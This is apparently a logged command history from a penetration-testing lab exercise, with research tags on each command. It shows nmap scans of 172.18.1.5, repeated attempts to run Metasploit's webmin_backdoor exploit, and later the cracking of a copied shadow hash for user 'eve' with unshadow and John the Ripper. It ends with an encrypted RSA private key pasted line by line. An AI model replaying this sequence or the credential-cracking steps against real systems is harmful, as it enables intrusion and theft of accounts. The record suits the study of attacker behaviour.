User 54 start time 1594797879 end 1594809736
PADDING
PADDING
PADDING
INPUT|54--0|U|1594797879|54|ping 172.18.1.5|OUTPUT
INPUT|54--1|A0 A1 |1594798011|54|nmap -p 60000-65536|OUTPUT
INPUT|54--2|A0 A1 |1594798018|54|nmap -p 60000-65535|OUTPUT
INPUT|54--3|M0 |1594798035|54|nmap 172.18.1.5 -p 60000-65535|OUTPUT
INPUT|54--4|A1 |1594798056|54|nmap 172.18.1.5 -p 40000-60000|OUTPUT
INPUT|54--5|A1 |1594798082|54|nmap 172.18.1.5 -p 20000-40000|OUTPUT
INPUT|54--6|A1 |1594798101|54|nmap 172.18.1.5 -p 1000-20000|OUTPUT
INPUT|54--7|U|1594798263|54|exit|OUTPUT
INPUT|54--8|U|1594798381|54|help|OUTPUT
INPUT|54--9|U|1594798386|54|man msf|OUTPUT
INPUT|54--10|M2 |1594798433|54|man msfconsole|OUTPUT
INPUT|54--11|U|1594798438|54|msfconsole|OUTPUT
INPUT|54--12|U|1594798493|54|help|OUTPUT
INPUT|54--13|A1 |1594798590|54|nmap 172.18.1.5 -p 10000|OUTPUT
INPUT|54--14|A1 |1594798604|54|man nmap|OUTPUT
INPUT|54--15|M1 |1594798640|54|nmap 172.18.1.5 -p 10000 -sV|OUTPUT
INPUT|54--16|U|1594799097|54|nikto -Help|OUTPUT
INPUT|54--17|U|1594799137|54|exit|OUTPUT
INPUT|54--18|M8 |1594799757|54|use exploit/linux/http/webmin_backdoor|OUTPUT
INPUT|54--19|A10 |1594799855|54|ls -a|OUTPUT
INPUT|54--20|U|1594799878|54|cd .msf4|OUTPUT
INPUT|54--21|A10 |1594799880|54|ls|OUTPUT
INPUT|54--22|U|1594799884|54|cd modules|OUTPUT
INPUT|54--23|A10 |1594799885|54|ls|OUTPUT
INPUT|54--24|A10 |1594799888|54|ls -a|OUTPUT
INPUT|54--25|U|1594799916|54|cd ~|OUTPUT
INPUT|54--26|M3 |1594799949|54|search webmin|OUTPUT
INPUT|54--27|U|1594800124|54|cd exploit|OUTPUT
INPUT|54--28|U|1594800154|54|search exploit/linux/http|OUTPUT
INPUT|54--29|U|1594800168|54|search exploit/linux/http/webmin|OUTPUT
INPUT|54--30|U|1594800232|54|info exploit/linux/http/webmin_packageup_rce|OUTPUT
INPUT|54--31|U|1594800323|54|searchsploit webmnin|OUTPUT
INPUT|54--32|U|1594800443|54|exit|OUTPUT
INPUT|54--33|U|1594800450|54|apt update|OUTPUT
INPUT|54--34|U|1594800462|54|apt install metasploit-framework|OUTPUT
INPUT|54--35|A10 |1594800908|54|ls /usr/share/metasploit-framework|OUTPUT
INPUT|54--36|A10 |1594800919|54|ls /usr/share/metasploit-framework/modules|OUTPUT
INPUT|54--37|A10 |1594800926|54|ls /usr/share/metasploit-framework/modules/exploits|OUTPUT
INPUT|54--38|A10 |1594800931|54|ls /usr/share/metasploit-framework/modules/exploits/linux|OUTPUT
INPUT|54--39|A10 |1594800946|54|ls /usr/share/metasploit-framework/modules/exploits/linux/http|OUTPUT
INPUT|54--40|A10 |1594800999|54|ls /usr/share/metasploit-framework/modules/exploits/linux|OUTPUT
INPUT|54--41|U|1594801009|54|msfconsole|OUTPUT
INPUT|54--42|U|1594801040|54|search webmin|OUTPUT
INPUT|54--43|U|1594801093|54|search webmin_back|OUTPUT
INPUT|54--44|U|1594801098|54|search webmin_backdoor|OUTPUT
INPUT|54--45|U|1594801207|54|use exploit/linux/http/webmin_backdoor.rb|OUTPUT
INPUT|54--46|A5 |1594801229|54|show targets|OUTPUT
INPUT|54--47|M5 |1594801253|54|show options|OUTPUT
INPUT|54--48|U|1594801270|54|help|OUTPUT
INPUT|54--49|U|1594801305|54|show options|OUTPUT
INPUT|54--50|M6 |1594801348|54|set LHOST 172.18.1.5|OUTPUT
INPUT|54--51|U|1594801361|54|show options|OUTPUT
INPUT|54--52|U|1594801452|54|set LHOST|OUTPUT
INPUT|54--53|U|1594801489|54|exit|OUTPUT
INPUT|54--54|U|1594801492|54|msfconsole|OUTPUT
INPUT|54--55|U|1594801558|54|use exploit/linux/http/webmin_backdoor.rb|OUTPUT
INPUT|54--56|U|1594801565|54|show options|OUTPUT
INPUT|54--57|U|1594801607|54|set RHOSTS 172.18.1.5|OUTPUT
INPUT|54--58|U|1594801616|54|show options|OUTPUT
INPUT|54--59|U|1594801643|54|exploit|OUTPUT
INPUT|54--60|U|1594801791|54|ifconfig|OUTPUT
INPUT|54--61|U|1594801863|54|set LHOST 0.0.0.0|OUTPUT
INPUT|54--62|U|1594801870|54|exploit|OUTPUT
INPUT|54--63|U|1594801971|54|run|OUTPUT
INPUT|54--64|U|1594802055|54|show options|OUTPUT
INPUT|54--65|U|1594802300|54|show missing|OUTPUT
INPUT|54--66|U|1594802371|54|show targets|OUTPUT
INPUT|54--67|A7 |1594802402|54|check 172.18.1.5|OUTPUT
INPUT|54--68|U|1594802424|54|show targets|OUTPUT
INPUT|54--69|U|1594802450|54|show options|OUTPUT
INPUT|54--70|U|1594802476|54|set target 0|OUTPUT
INPUT|54--71|U|1594802480|54|show options|OUTPUT
INPUT|54--72|U|1594802541|54|run|OUTPUT
INPUT|54--73|A7 |1594802619|54|check 172.18.1.5|OUTPUT
INPUT|54--74|U|1594802639|54|back|OUTPUT
INPUT|54--75|U|1594802648|54|use exploit/linux/http/webmin_backdoor.rb|OUTPUT
INPUT|54--76|A7 |1594802659|54|check 172.18.1.5|OUTPUT
INPUT|54--77|U|1594802669|54|show options|OUTPUT
INPUT|54--78|U|1594802697|54|show targets|OUTPUT
INPUT|54--79|U|1594802809|54|set target 1|OUTPUT
INPUT|54--80|A7 |1594802833|54|check 172.18.1.5|OUTPUT
INPUT|54--81|U|1594802886|54|exit|OUTPUT
INPUT|54--82|U|1594802892|54|msfconsole|OUTPUT
INPUT|54--83|U|1594802964|54|use exploit/linux/http/webmin_backdoor|OUTPUT
INPUT|54--84|U|1594802974|54|show targets|OUTPUT
INPUT|54--85|U|1594802981|54|show options|OUTPUT
INPUT|54--86|A7 |1594803009|54|check 172.18.1.5|OUTPUT
INPUT|54--87|U|1594803090|54|ifconfig|OUTPUT
INPUT|54--88|U|1594803108|54|set LHOST 10.1.135.83|OUTPUT
INPUT|54--89|A7 |1594803114|54|check 172.18.1.5|OUTPUT
INPUT|54--90|U|1594803124|54|run|OUTPUT
INPUT|54--91|U|1594803164|54|set RHOSTS 172.18.1.5|OUTPUT
INPUT|54--92|U|1594803357|54|run|OUTPUT
INPUT|54--93|U|1594803753|54|nmap -sn 172.18.1.5/24|OUTPUT
INPUT|54--94|U|1594804367|54|arp -a|OUTPUT
INPUT|54--95|U|1594804612|54|nmap 172.18.1.1|OUTPUT
INPUT|54--96|U|1594805033|54|arp -a|OUTPUT
INPUT|54--97|U|1594805091|54|nmap 147.251.6.10|OUTPUT
INPUT|54--98|U|1594806393|54|show options|OUTPUT
INPUT|54--99|U|1594806404|54|ifconfig|OUTPUT
INPUT|54--100|U|1594806783|54|msfconsole|OUTPUT
INPUT|54--101|U|1594806833|54|use exploit/linux/http/webmin/backdoor|OUTPUT
INPUT|54--102|U|1594806838|54|use exploit/linux/http/webmin/backdoor.rb|OUTPUT
INPUT|54--103|U|1594806843|54|use exploit/linux/http/webmin/backdoor.br|OUTPUT
INPUT|54--104|U|1594806863|54|use exploit/linux/http/webmin_backdoor|OUTPUT
INPUT|54--105|U|1594806876|54|show options|OUTPUT
INPUT|54--106|U|1594806912|54|set RHOSTS 172.18.1.5|OUTPUT
INPUT|54--107|U|1594806924|54|ifconfig|OUTPUT
INPUT|54--108|U|1594806957|54|set LHOST 10.1.135.83|OUTPUT
INPUT|54--109|U|1594806981|54|run|OUTPUT
INPUT|54--110|A7 |1594807001|54|check 172.18.1.5|OUTPUT
INPUT|54--111|U|1594807504|54|nmap 10.1.17.4|OUTPUT
INPUT|54--112|U|1594807968|54|echo eve:$6$024QHRGPtY7RBi.t$5mfgbDY10e7Q3HiWd2YcHRY2KWj7BRWobrSCe5kCBSw3ZMwEfFvxO625d9aQyswMr9hEGF79I1KvwswSzsklp/:18451:0:99999:7::: > shadow|OUTPUT
INPUT|54--113|A9 A11 A12 A17 |1594807973|54|cat shadow|OUTPUT
INPUT|54--114|U|1594808006|54|echo eve:x:1003:1003::/home/eve:/bin/bash > passwd|OUTPUT
INPUT|54--115|A10 |1594808008|54|ls|OUTPUT
INPUT|54--116|U|1594808043|54|unshadow passwd shadow > mypasswd.txt|OUTPUT
INPUT|54--117|A10 |1594808048|54|ls|OUTPUT
INPUT|54--118|A9 A11 A12 A17 |1594808055|54|cat mypasswd.txt|OUTPUT
INPUT|54--119|A14 |1594808099|54|john mypasswd.txt|OUTPUT
INPUT|54--120|A14 |1594808119|54|john shadow|OUTPUT
INPUT|54--121|U|1594808248|54|echo eve:$6$024QHRGPtY7RBi.t$5mfgbDY10e7Q3HiWd2YcHRY2KWj7BRWobrSCe5kCBSw3ZMwEfFvxO625d9aQyswMr9hEGF79I1KvwswSzsklp/:18451:0:99999:7::: > shadow|OUTPUT
INPUT|54--122|A9 A11 A12 A17 |1594808251|54|cat shadow|OUTPUT
INPUT|54--123|U|1594808608|54|echo eve:$6$024QHRGPtY7RBi.t$5mfgbDY10e7Q3HiWd2YcHRY2KWj7BRWobrSCe5kCBSw3ZMwEfFvxO625d9aQyswMr9hEGF79I1KvwswSzsklp/:18451:0:99999:7::: > shadow|OUTPUT
INPUT|54--124|A9 A11 A12 A17 |1594808612|54|cat shadow|OUTPUT
INPUT|54--125|U|1594808628|54|nano shadow|OUTPUT
INPUT|54--126|A9 A11 A12 A17 |1594808665|54|cat shadow|OUTPUT
INPUT|54--127|U|1594808679|54|unshadow passwd shadow > mypasswd.txt|OUTPUT
INPUT|54--128|A14 |1594808693|54|john mypasswd.txt|OUTPUT
INPUT|54--129|U|1594808888|54|run|OUTPUT
INPUT|54--130|U|1594809160|54|echo -----BEGIN RSA PRIVATE KEY-----|OUTPUT
INPUT|54--131|U|1594809160|54|Proc-Type: 4|OUTPUT
INPUT|54--132|U|1594809160|54|DEK-Info: AES-128-CBC|OUTPUT
INPUT|54--133|U|1594809160|54|Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2rKTU3w4k|OUTPUT
INPUT|54--134|U|1594809160|54|2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/JqYBSDl|OUTPUT
INPUT|54--135|U|1594809160|54|yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+uoXaRRJ|OUTPUT
INPUT|54--136|A10 |1594809160|54|Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725tDOtR6zB|OUTPUT
INPUT|54--137|U|1594809160|54|9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2jLGg4Mp|OUTPUT
INPUT|54--138|U|1594809160|54|N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sDfO/gw1R|OUTPUT
INPUT|54--139|U|1594809161|54|BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH4DCFgZ+|OUTPUT
INPUT|54--140|U|1594809161|54|/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73otlGZyR7|OUTPUT
INPUT|54--141|U|1594809161|54|5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpathYz1sUhe|OUTPUT
INPUT|54--142|U|1594809161|54|RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0DwwVwm2S|OUTPUT
INPUT|54--143|U|1594809161|54|vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/SBFYVy0F|OUTPUT
INPUT|54--144|U|1594809161|54|TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZItCtQK2|OUTPUT
INPUT|54--145|U|1594809161|54|pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQoyqBY2o|OUTPUT
INPUT|54--146|U|1594809161|54|TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQgTg62m7e|OUTPUT
INPUT|54--147|U|1594809161|54|0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68wBG67v+a|OUTPUT
INPUT|54--148|U|1594809161|54|d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx54vd8N3|OUTPUT
INPUT|54--149|U|1594809161|54|qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwDL4zVF5X|OUTPUT
INPUT|54--150|U|1594809161|54|rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgswjSO4V5q|OUTPUT
INPUT|54--151|U|1594809161|54|anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73mu00IXl|OUTPUT
INPUT|54--152|U|1594809161|54|FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02j218KSm|OUTPUT
INPUT|54--153|U|1594809161|54|TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dDNC5kybN|OUTPUT
INPUT|54--154|U|1594809161|54|aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6Og7AllVL|OUTPUT
INPUT|54--155|U|1594809161|54|uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6Id5X7uCQ|OUTPUT
INPUT|54--156|U|1594809161|54|pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfIEDCzH9G|OUTPUT
INPUT|54--157|U|1594809161|54|Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhmFpapjdW|OUTPUT
INPUT|54--158|U|1594809161|54|/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4GJZAfqX|OUTPUT
INPUT|54--159|U|1594809161|54|WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoXp+zyqT6|OUTPUT
INPUT|54--160|U|1594809161|54|bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1rvkbaSm|OUTPUT
INPUT|54--161|U|1594809161|54|sCLJmNBb/7o7QR1Hhvo7NN1z85CJr9yxC6MqLbbcv91Mhb3w1Ce2eL+QnhgE86HE|OUTPUT
INPUT|54--162|U|1594809161|54|I0lvTSHTPFgvw00pV4bypACc28X+0YjRVRFOxqZxidw256pubOjRjIHIG5n6eMYk|OUTPUT
INPUT|54--163|U|1594809161|54|W3XiLqeGN7DLwY8X6RXfqafVQmJR6j3zB/PAoSVh25eTQwl2i1rgYzo0IGcdwUxN|OUTPUT
INPUT|54--164|U|1594809161|54|KHGCl8kHWe7ks3KT4+WU9uZZAhAECaWJvLzo2Ba6dst/Ke7KEtmGwv5ExUUvfHve|OUTPUT
INPUT|54--165|U|1594809161|54|0mt+olWJFSJa072UPuHe7gWdlexqh0l59q4ohOG+zJke1u74Br9wo6KIv54IqGVS|OUTPUT
INPUT|54--166|U|1594809161|54|y2O0rVCjsin3d2h9F0Fp0Xvc3EHZD7ct2HvZEV6x3kUlfdWeHKuF+7wUeTJfSmvq|OUTPUT
INPUT|54--167|U|1594809161|54|9+LnogQTclKAVk8htnrxBQh7aPLBAyTaXACAL31bB0ZXfh0yhJX6bXIe+EVPNaf6|OUTPUT
INPUT|54--168|U|1594809161|54|rJf/WLYf6/Lmfgv/ECF+VqdLPGkLT8dEgrajh9t2TaoU+/+mxtGXaJ7Iea9I+g9l|OUTPUT
INPUT|54--169|U|1594809161|54|22unE+jCDSQMF9IygWb8HfzBsruZ7IQ+/h7g7XDpEZrJf6+mdmbzBXLwlnnD1XG3|OUTPUT
INPUT|54--170|U|1594809161|54|FEJ08UNnUQsuqoD+vPxunBwkFv5b/5yt0XMu9tZdXk9AW9BdasCIE1bY+au0cnTX|OUTPUT
INPUT|54--171|U|1594809161|54|rjmFQ+KmCqH5lReI0Ai3fJ8pnZ2D3/m7AV/1llNaijp9NmriqK0jiVBpnEM+uH3a|OUTPUT
INPUT|54--172|U|1594809161|54|WtUQOqd4QS2S8MwjPoBZ0hpXOY0JX95EvWhp58uOy0/o8yYSbb+bZe7g0+MJuF9R|OUTPUT
INPUT|54--173|U|1594809162|54|Rj6xI5CiBdDo83VdQHlyaUawTlv/wUpqSRc9xsK/y2dLjzQhAD+QkWbm98jrcAGX|OUTPUT
INPUT|54--174|U|1594809162|54|Tlqk1XDm0e9sNcXus5d5pnTWeCH4bnwnQDo0Ot/KljNmnG11/FXuPFnAToOq52Az|OUTPUT
